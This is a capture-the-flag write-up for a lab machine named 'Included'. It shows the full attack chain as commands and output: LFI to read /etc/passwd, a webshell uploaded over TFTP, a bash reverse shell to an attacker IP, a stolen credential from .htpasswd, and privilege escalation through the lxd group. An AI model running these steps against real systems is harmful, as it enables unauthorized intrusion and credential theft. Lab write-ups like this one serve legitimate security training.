
## CTF Writeup: Included

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.185
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 01:16 -0500
Nmap scan report for 10.129.95.185
Host is up (0.028s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php
|_http-server-header: Apache/2.4.29 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.18 seconds
```

Upon inspecting the webpage we immediatly identify an interesting parameter "file" inside the url. We could check if LFI / RFI is possible.

```
http://10.129.95.185/?file=home.php
```

Indeed it worked! This displayed the passwd file. Which displayed a list of all users on the target server.

```
http://10.129.95.185/?file=/etc/passwd
```

We were able to identify an user called "mike" from the list.

```
nmap -sU --top-ports 100 10.129.95.185
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 02:55 -0500
Nmap scan report for 10.129.95.185
Host is up (0.029s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 108.09 seconds
```

As we can see from the UDP Scan, we were able to identify tftp open. Let's connect to it.

Uploaded webshell.

```
tftp 10.129.95.185
tftp> put wolfswebshell.php
```

Since we identified an LFI, we can view/execute the webshell when inspecting it in the browser.

```
http://10.129.95.185/?file=/var/lib/tftpboot/wolfswebshell.php
```

Started up listener on port 43.

```
nc -lvnp 43
```

Executed the following bash one-liner reverse shell script.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/43 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 43                           
listening on [any] 43 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.95.185] 41164
bash: cannot set terminal process group (1505): Inappropriate ioctl for device
bash: no job control in this shell
www-data@included:/var/www/html$
```

Enumerated an interesting .htpasswd file inside the web-root which provided us with credentials for user "mike".

```
mike:Sheffield19
```

Since we need an tty shell in order to login into mike in our current reverse shell, we'll perform lightweight shell hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Navigated into /home/mike directory and identified user.txt flag.

```
a56ef91d70cfbf2cdb8f454c006935a1
```
## Privilege Escalation

Enumerated that user "mike" is part of the lxd group, which allows us to privesc using the lxd container.

```
id
```

We'll use the following container builder.

```
git clone https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
sudo ./build-alpine  
```

1. Upload it to target machine

```
wget http://10.10.14.44/alpine-v3.13-x86_64-20210218_0139.tar.gz alpine-v3.13-x86_64-20210218_0139.tar.gz
```

2. Create Container Image

**NOTE**: Press enter the whole.
```
lxd init
```

3. Execute the following commands

```
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias hacked
lxc image list
lxc storage create default dir
lxc init hacked container -c security.privileged=true -s default
lxc config device add container mydevice disk source=/ path=/mnt/root recursive=true
lxc start container
lxc exec container /bin/sh
```

Since we mounted the entire filesystem into the container, we can now view the root directory inside /mnt/root.

```
cd /mnt/root
```

Retrieved root.txt in /mnt/root directory.

```
c693d9c7499d9f572ee375d4c14c7bcf
```